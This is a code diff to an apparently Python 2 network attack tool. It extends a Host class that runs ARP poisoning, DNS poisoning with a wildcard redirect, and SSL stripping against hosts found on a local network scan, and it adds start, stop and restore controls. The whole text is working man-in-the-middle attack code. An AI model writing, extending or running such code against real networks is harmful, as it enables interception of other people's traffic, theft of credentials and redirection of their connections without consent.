@@ -16,7 +16,8 @@ class Host():
         self.arp_started    = False
         self.dns_poisoner   = DnsPoisoner(ip, dns_queue_num)
         self.dns_started    = False
-        self.ssl_remover    = SslRemover(ip, dns_queue_num + 1)
+        self.ssl_remover    = SslRemover(dns_queue_num + 1)
+        self.ssl_started    = False
         self.seen_this_scan = True
 
     # prepares one-way arp poisoning attack, telling this host that "other_ip" is at "other_mac"
@@ -72,6 +73,14 @@ class Host():
             self.arp_poisoner.start()
             self.arp_started = True
 
+    # restores arp packets to before their original pre-spoof state
+    def arp_restore(self, mac_attacker, mac_gateway, ip_gateway):
+
+        if self.arp_started:
+            print "Please stop running the current arp poisoning attack"
+        else:
+            self.arp_poisoner.restore_arp(mac_attacker, self.mac, self.ip, mac_gateway, ip_gateway)
+
     # stops currently running arp poisoning attack
     def arp_stop(self):
 
@@ -82,6 +91,18 @@ class Host():
     def dns_add(self, url, ip):
 
         self.dns_poisoner.add_url(url, ip)
+
+    def dns_clean(self):
+
+        self.dns_poisoner.clean_urls()
+
+    def dns_ensure(self, ip):
+
+        if self.dns_started:
+            
+            self.dns_stop()
+            self.dns_add("*", ip)
+            self.dns_start()
 
     def dns_start(self):
 
@@ -96,12 +117,24 @@ class Host():
 
         if self.dns_started:
             self.dns_poisoner.stop()
-            self.dns_started = False
+
+    def ssl_start(self):
+
+        if not self.ssl_started:
+            self.ssl_remover.start()
+            self.ssl_started = True
+
+    def ssl_stop(self):
+
+        if self.ssl_started:
+            self.ssl_remover.stop()
+            self.ssl_started = False
 
     def remove(self):
-
+        
         self.arp_poisoner.stop()
         self.dns_poisoner.stop()
+        self.ssl_remover.stop()
 
 # scan on specified range and interface, return found gateway and hosts
 def get_hosts(interface, range_, timeout, gateway, hosts):
@@ -147,7 +180,7 @@ def get_hosts(interface, range_, timeout, gateway, hosts):
 
             # store other ip's in the list of hosts
             else:
-                hosts.append(Host(reply.psrc, reply.hwsrc, interface, 2*(len(hosts) + 1) ))
+                hosts.append(Host(reply.psrc, reply.hwsrc, interface, 3*(len(hosts) + 1) ))
 
     gateway = gateway if gateway.seen_this_scan else None
     hosts   = [host for host in hosts if host.seen_this_scan]
